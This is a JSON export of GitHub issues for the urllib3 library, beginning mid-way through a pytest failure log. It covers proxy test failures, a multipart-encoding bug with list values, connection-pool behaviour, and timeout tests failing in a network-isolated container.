ResponseError(cause))\r\nMaxRetryError: HTTPConnectionPool(host='::1', port=39839): Max retries exceeded with url: http://localhost:36895/ (Caused by ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83d48d0>: Failed to establish a new connection: [Errno 111] Connection refused',)))\r\n-------------------------------------------------------------- Captured stdout call ---------------------------------------------------------------\r\nRetrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e8405750>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:45733/\r\nRetrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e8405750>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:45733/\r\nRetrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cb210>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:45733/\r\nRetrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cb210>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:45733/\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cbd90>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:45733/\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cbd90>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:45733/\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e8405750>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:45733/\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cb210>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:45733/\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cbd90>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:45733/\r\n-------------------------------------------------------------- Captured stdout call ---------------------------------------------------------------\r\nRetrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cbb10>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:36895/\r\nRetrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cbb10>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:36895/\r\nRetrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cb1d0>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:36895/\r\nRetrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cb1d0>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:36895/\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cbe10>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:36895/\r\nRetrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cbe10>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:36895/\r\n---------------------------------------------------------------- Captured log call ----------------------------------------------------------------\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cbb10>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:36895/\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cb1d0>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:36895/\r\nWARNING  urllib3.connectionpool:connectionpool.py:745 Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83cbe10>: Failed to establish a new connection: [Errno 111] Connection refused',))': http://localhost:36895/\r\n================================================================ warnings summary =================================================================\r\ntest/test_ssl.py::test_context_sni_with_ip_address[False-www.python.org-False]\r\n  /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/ssl_.py:380: SNIMissingWarning: An HTTPS request has been made, but the SNI (Server Name Indication) extension to TLS is not available on this platform. This may cause the server to present an incorrect TLS certificate, which can cause validation failures. You can upgrade to a newer version of Python to solve this. For more information, see https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings\r\n    SNIMissingWarning,\r\n\r\ntest/contrib/test_pyopenssl.py::TestHTTPS::test_https_timeout\r\ntest/contrib/test_pyopenssl.py::TestHTTPS::test_tunnel\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1::test_https_timeout\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1::test_tunnel\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_1::test_https_timeout\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_1::test_tunnel\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_2::test_https_timeout\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_2::test_tunnel\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_3::test_https_timeout\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_TLSv1_3::test_tunnel\r\ntest/with_dummyserver/test_https.py::TestHTTPS::test_https_timeout\r\ntest/with_dummyserver/test_https.py::TestHTTPS::test_tunnel\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1::test_https_timeout\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1::test_tunnel\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_1::test_https_timeout\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_1::test_tunnel\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_2::test_https_timeout\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_2::test_tunnel\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_3::test_https_timeout\r\ntest/with_dummyserver/test_https.py::TestHTTPS_TLSv1_3::test_tunnel\r\ntest/with_dummyserver/test_no_ssl.py::TestHTTPSWithoutSSL::test_simple\r\ntest/with_dummyserver/test_proxy_poolmanager.py::TestHTTPProxyManager::test_proxy_pooling\r\ntest/with_dummyserver/test_proxy_poolmanager.py::TestHTTPProxyManager::test_proxy_pooling\r\ntest/with_dummyserver/test_proxy_poolmanager.py::TestHTTPProxyManager::test_proxy_pooling\r\ntest/with_dummyserver/test_proxy_poolmanager.py::TestHTTPProxyManager::test_proxy_pooling\r\ntest/with_dummyserver/test_socketlevel.py::TestProxyManager::test_connect_ipv6_addr\r\n  /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:1004: InsecureRequestWarning: Unverified HTTPS request is being made to host 'localhost'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#ssl-warnings\r\n    InsecureRequestWarning,\r\n\r\ntest/contrib/test_pyopenssl.py::TestHTTPS_IPv6Addr::test_strip_square_brackets_before_validating\r\ntest/with_dummyserver/test_https.py::TestHTTPS_IPv6Addr::test_strip_square_brackets_before_validating\r\n  /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connection.py:384: SubjectAltNameWarning: Certificate for ::1 has no `subjectAltName`, falling back to check for a `commonName` for now. This feature is being removed by major browsers and deprecated by RFC 2818. (See https://github.com/urllib3/urllib3/issues/497 for details.)\r\n    SubjectAltNameWarning,\r\n\r\ntest/contrib/test_pyopenssl.py::TestSNI::test_hostname_in_first_request_packet\r\n  /tmp/urllib3/dummyserver/server.py:128: NoIPv6Warning: No IPv6 support. Falling back to IPv4.\r\n    warnings.warn(\"No IPv6 support. Falling back to IPv4.\", NoIPv6Warning)\r\n\r\ntest/with_dummyserver/test_connectionpool.py::TestConnectionPool::test_source_address\r\n  /tmp/urllib3/test/with_dummyserver/test_connectionpool.py:688: NoIPv6Warning: No IPv6 support: skipping.\r\n    warnings.warn(\"No IPv6 support: skipping.\", NoIPv6Warning)\r\n\r\n-- Docs: https://docs.pytest.org/en/latest/warnings.html\r\n===Flaky Test Report===\r\n\r\ntest_client_no_intermediate failed (1 runs remaining out of 2).\r\n\t<class 'urllib3.exceptions.ProtocolError'>\r\n\t('Connection aborted.', error(104, 'Connection reset by peer'))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_https.py:139>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:376>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:672>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:387>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1069>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1109>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1065>, <TracebackEntry /usr/lib64/python2.7/httplib.py:892>, <TracebackEntry /usr/lib64/python2.7/httplib.py:868>, <TracebackEntry /usr/lib64/python2.7/ssl.py:741>, <TracebackEntry /usr/lib64/python2.7/ssl.py:707>]\r\ntest_client_no_intermediate failed; it passed 0 out of the required 1 times.\r\n\t<class 'urllib3.exceptions.ProtocolError'>\r\n\t('Connection aborted.', error(104, 'Connection reset by peer'))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_https.py:139>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:376>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:672>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:387>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1069>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1109>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1065>, <TracebackEntry /usr/lib64/python2.7/httplib.py:892>, <TracebackEntry /usr/lib64/python2.7/httplib.py:868>, <TracebackEntry /usr/lib64/python2.7/ssl.py:741>, <TracebackEntry /usr/lib64/python2.7/ssl.py:707>]\r\ntest_client_no_intermediate failed (1 runs remaining out of 2).\r\n\t<class 'urllib3.exceptions.ProtocolError'>\r\n\t('Connection aborted.', error(104, 'Connection reset by peer'))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_https.py:139>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:376>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:672>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:387>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1069>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1109>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1065>, <TracebackEntry /usr/lib64/python2.7/httplib.py:892>, <TracebackEntry /usr/lib64/python2.7/httplib.py:868>, <TracebackEntry /usr/lib64/python2.7/ssl.py:741>, <TracebackEntry /usr/lib64/python2.7/ssl.py:707>]\r\ntest_client_no_intermediate failed; it passed 0 out of the required 1 times.\r\n\t<class 'urllib3.exceptions.ProtocolError'>\r\n\t('Connection aborted.', error(104, 'Connection reset by peer'))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_https.py:139>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:376>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:672>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:387>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1069>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1109>, <TracebackEntry /usr/lib64/python2.7/httplib.py:1065>, <TracebackEntry /usr/lib64/python2.7/httplib.py:892>, <TracebackEntry /usr/lib64/python2.7/httplib.py:868>, <TracebackEntry /usr/lib64/python2.7/ssl.py:741>, <TracebackEntry /usr/lib64/python2.7/ssl.py:707>]\r\ntest_basic_ipv6_proxy failed (1 runs remaining out of 2).\r\n\t<class 'urllib3.exceptions.MaxRetryError'>\r\n\tHTTPConnectionPool(host='::1', port=38641): Max retries exceeded with url: http://localhost:45733/ (Caused by ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e8493b50>: Failed to establish a new connection: [Errno 111] Connection refused',)))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py:363>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:466>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:328>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:436>]\r\ntest_basic_ipv6_proxy failed; it passed 0 out of the required 1 times.\r\n\t<class 'urllib3.exceptions.MaxRetryError'>\r\n\tHTTPConnectionPool(host='::1', port=39839): Max retries exceeded with url: http://localhost:36895/ (Caused by ProxyError('Cannot connect to proxy.', NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f83e83d48d0>: Failed to establish a new connection: [Errno 111] Connection refused',)))\r\n\t[<TracebackEntry /tmp/urllib3/test/with_dummyserver/test_proxy_poolmanager.py:363>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:76>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/request.py:97>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:466>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/poolmanager.py:328>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:760>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/connectionpool.py:720>, <TracebackEntry /tmp/urllib3/.nox/test-2-7/lib/python2.7/site-packages/urllib3/util/retry.py:436>]\r\n\r\n===End Flaky Test Report===\r\n============================================================= short test summary info =============================================================\r\nSKIPPED [2] /tmp/urllib3/test/with_dummyserver/test_https.py:672: Skipping base test class\r\nSKIPPED [2] test/test_util.py:461: only run if brotlipy is absent\r\nSKIPPED [1] test/with_dummyserver/test_socketlevel.py:1579: Header parsing errors not available\r\nSKIPPED [1] /tmp/urllib3/test/__init__.py:90: test_parse_url_bytes_type_error_python_3 requires Python3.x to run\r\nSKIPPED [1] /tmp/urllib3/test/__init__.py:90: test_httplib_headers_case_insensitive requires Python3.x to run\r\nSKIPPED [2] /tmp/urllib3/test/with_dummyserver/test_https.py:656: Skipping base test class\r\nSKIPPED [1] test/with_dummyserver/test_socketlevel.py:1585: Header parsing errors not available\r\nSKIPPED [1] test/with_dummyserver/test_socketlevel.py:1582: Header parsing errors not available\r\nSKIPPED [163] /tmp/urllib3/test/contrib/test_securetransport.py:21: Could not import SecureTransport: ImportError('The library Security could not be found',)\r\nFAILED test/with_dummyserver/test_https.py::TestHTTPS::test_client_no_intermediate - ProtocolError: ('Connection aborted.', error(104, 'Connecti...\r\nFAILED test/with_dummyserver/test_https.py::TestHTTPS_TLSv1_3::test_client_no_intermediate - ProtocolError: ('Connection aborted.', error(104, '...\r\nFAILED test/with_dummyserver/test_proxy_poolmanager.py::TestIPv6HTTPProxyManager::test_basic_ipv6_proxy - MaxRetryError: HTTPConnectionPool(host...\r\n======================================== 3 failed, 1140 passed, 174 skipped, 31 warnings in 173.34 seconds ========================================\r\n```", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1765", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1765/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1765/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1765/events", "html_url": "https://github.com/urllib3/urllib3/issues/1765", "id": 530625049, "node_id": "MDU6SXNzdWU1MzA2MjUwNDk=", "number": 1765, "title": "cannot encode list with filepost.encode_multipart_formdata", "user": {"login": "ChemicalXandco", "id": 32775248, "node_id": "MDQ6VXNlcjMyNzc1MjQ4", "avatar_url": "https://avatars3.githubusercontent.com/u/32775248?v=4", "gravatar_id": "", "url": "https://api.github.com/users/ChemicalXandco", "html_url": "https://github.com/ChemicalXandco", "followers_url": "https://api.github.com/users/ChemicalXandco/followers", "following_url": "https://api.github.com/users/ChemicalXandco/following{/other_user}", "gists_url": "https://api.github.com/users/ChemicalXandco/gists{/gist_id}", "starred_url": "https://api.github.com/users/ChemicalXandco/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/ChemicalXandco/subscriptions", "organizations_url": "https://api.github.com/users/ChemicalXandco/orgs", "repos_url": "https://api.github.com/users/ChemicalXandco/repos", "events_url": "https://api.github.com/users/ChemicalXandco/events{/privacy}", "received_events_url": "https://api.github.com/users/ChemicalXandco/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2019-11-30T20:13:27Z", "updated_at": "2019-12-02T13:59:53Z", "closed_at": "2019-12-02T13:59:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "when I run this code:\r\n```py\r\nfields = {'tags': ['tag1', 'tag2']}\r\n(output, contentType) = urllib3.filepost.encode_multipart_formdata(fields)\r\n```\r\nI get this error:\r\n```\r\n(output, contentType) = urllib3.filepost.encode_multipart_formdata(fields)\r\n  File \"C:\\Program Files\\Python36\\lib\\site-packages\\urllib3\\filepost.py\", line 90, in encode_multipart_formdata\r\n    body.write(data)\r\nTypeError: a bytes-like object is required, not 'list'\r\n```\r\nI expect the list to be encoded, why is it not working?\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1758", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1758/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1758/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1758/events", "html_url": "https://github.com/urllib3/urllib3/issues/1758", "id": 528297279, "node_id": "MDU6SXNzdWU1MjgyOTcyNzk=", "number": 1758, "title": "Established connections are replaced by None values", "user": {"login": "jaimefrites", "id": 1390816, "node_id": "MDQ6VXNlcjEzOTA4MTY=", "avatar_url": "https://avatars1.githubusercontent.com/u/1390816?v=4", "gravatar_id": "", "url": "https://api.github.com/users/jaimefrites", "html_url": "https://github.com/jaimefrites", "followers_url": "https://api.github.com/users/jaimefrites/followers", "following_url": "https://api.github.com/users/jaimefrites/following{/other_user}", "gists_url": "https://api.github.com/users/jaimefrites/gists{/gist_id}", "starred_url": "https://api.github.com/users/jaimefrites/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/jaimefrites/subscriptions", "organizations_url": "https://api.github.com/users/jaimefrites/orgs", "repos_url": "https://api.github.com/users/jaimefrites/repos", "events_url": "https://api.github.com/users/jaimefrites/events{/privacy}", "received_events_url": "https://api.github.com/users/jaimefrites/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 0, "created_at": "2019-11-25T19:41:59Z", "updated_at": "2020-04-28T12:57:17Z", "closed_at": "2020-04-28T12:57:17Z", "author_association": "NONE", "active_lock_reason": null, "body": "Hello!\r\n\r\nWhen pool is in blocking mode, there is no connections in pool, and getting connection from pool is timed out.\r\n\r\nhttps://github.com/urllib3/urllib3/pull/1759", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/urllib3/urllib3/issues/1756", "repository_url": "https://api.github.com/repos/urllib3/urllib3", "labels_url": "https://api.github.com/repos/urllib3/urllib3/issues/1756/labels{/name}", "comments_url": "https://api.github.com/repos/urllib3/urllib3/issues/1756/comments", "events_url": "https://api.github.com/repos/urllib3/urllib3/issues/1756/events", "html_url": "https://github.com/urllib3/urllib3/issues/1756", "id": 527173692, "node_id": "MDU6SXNzdWU1MjcxNzM2OTI=", "number": 1756, "title": "test_https_timeout & test_enhanced_timeout fail when there's no networking", "user": {"login": "mgorny", "id": 110765, "node_id": "MDQ6VXNlcjExMDc2NQ==", "avatar_url": "https://avatars1.githubusercontent.com/u/110765?v=4", "gravatar_id": "", "url": "https://api.github.com/users/mgorny", "html_url": "https://github.com/mgorny", "followers_url": "https://api.github.com/users/mgorny/followers", "following_url": "https://api.github.com/users/mgorny/following{/other_user}", "gists_url": "https://api.github.com/users/mgorny/gists{/gist_id}", "starred_url": "https://api.github.com/users/mgorny/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/mgorny/subscriptions", "organizations_url": "https://api.github.com/users/mgorny/orgs", "repos_url": "https://api.github.com/users/mgorny/repos", "events_url": "https://api.github.com/users/mgorny/events{/privacy}", "received_events_url": "https://api.github.com/users/mgorny/received_events", "type": "User", "site_admin": false}, "labels": [{"id": 165387, "node_id": "MDU6TGFiZWwxNjUzODc=", "url": "https://api.github.com/repos/urllib3/urllib3/labels/Contributor%20Friendly%20%E2%99%A5", "name": "Contributor Friendly \u2665", "color": "000000", "default": false, "description": null}], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 8, "created_at": "2019-11-22T12:40:03Z", "updated_at": "2020-04-24T12:50:15Z", "closed_at": "2020-04-24T12:50:15Z", "author_association": "CONTRIBUTOR", "active_lock_reason": null, "body": "We're running tests in a container isolated from external networks (having only `lo`), and the two mentioned tests seem to fail when external network isn't present, e.g.:\r\n\r\n```\r\n__________________________________________________________ TestHTTPS.test_https_timeout ___________________________________________________________\r\n\r\nargs = (<test.with_dummyserver.test_https.TestHTTPS object at 0x7f2e0e7ebe50>,), kwargs = {}\r\n\r\n    @six.wraps(test)\r\n    def wrapper(*args, **kwargs):\r\n        global _requires_network_has_route\r\n    \r\n        if _requires_network_has_route is None:\r\n>           _requires_network_has_route = _has_route()\r\n\r\ntest/__init__.py:175: \r\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\r\ntest/__init__.py:159: in _has_route\r\n    sock = socket.create_connection((TARPIT_HOST, 80), 0.0001)\r\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\r\n\r\naddress = ('10.255.255.1', 80), timeout = 0.0001, source_address = None\r\n\r\n    def create_connection(address, timeout=_GLOBAL_DEFAULT_TIMEOUT,\r\n                          source_address=None):\r\n        \"\"\"Connect to *address* and return the socket object.\r\n    \r\n        Convenience function.  Connect to *address* (a 2-tuple ``(host,\r\n        port)``) and return the socket object.  Passing the optional\r\n        *timeout* parameter will set the timeout on the socket instance\r\n        before attempting to connect.  If no *timeout* is supplied, the\r\n        global default timeout setting returned by :func:`getdefaulttimeout`\r\n        is used.  If *source_address* is set it must be a tuple of (host, port)\r\n        for the socket to bind as a source address before making the connection.\r\n        A host of '' or port 0 tells the OS to use the default.\r\n        \"\"\"\r\n    \r\n        host, port = address\r\n        err = None\r\n        for res in getaddrinfo(host, port, 0, SOCK_STREAM):\r\n            af, socktype, proto, canonname, sa = res\r\n            sock = None\r\n            try:\r\n                sock = socket(af, socktype, proto)\r\n                if timeout is not _GLOBAL_DEFAULT_TIMEOUT:\r\n                    sock.settimeout(timeout)\r\n                if source_address:\r\n                    sock.bind(source_address)\r\n                sock.connect(sa)\r\n                return sock\r\n    \r\n            except error as _:\r\n                err = _\r\n                if sock is not None:\r\n                    sock.close()\r\n    \r\n        if err is not None:\r\n>           raise err\r\nE           error: [Errno 111] Connection refused\r\n\r\n/usr/lib64/python2.7/socket.py:575: error\r\n_________________________________________________________ TestHTTPS.test_enhanced_timeout _________________________________________________________\r\n\r\nargs = (<test.with_dummyserver.test_https.TestHTTPS object at 0x7f2e0ec1d4d0>,), kwargs = {}\r\n\r\n    @six.wraps(test)\r\n    def wrapper(*args, **kwargs):\r\n        global _requires_network_has_route\r\n    \r\n        if _requires_network_has_route is None:\r\n>           _requires_network_has_route = _has_route()\r\n\r\ntest/__init__.py:175: \r\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\r\ntest/__init__.py:159: in _has_route\r\n    sock = socket.create_connection((TARPIT_HOST, 80), 0.0001)\r\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 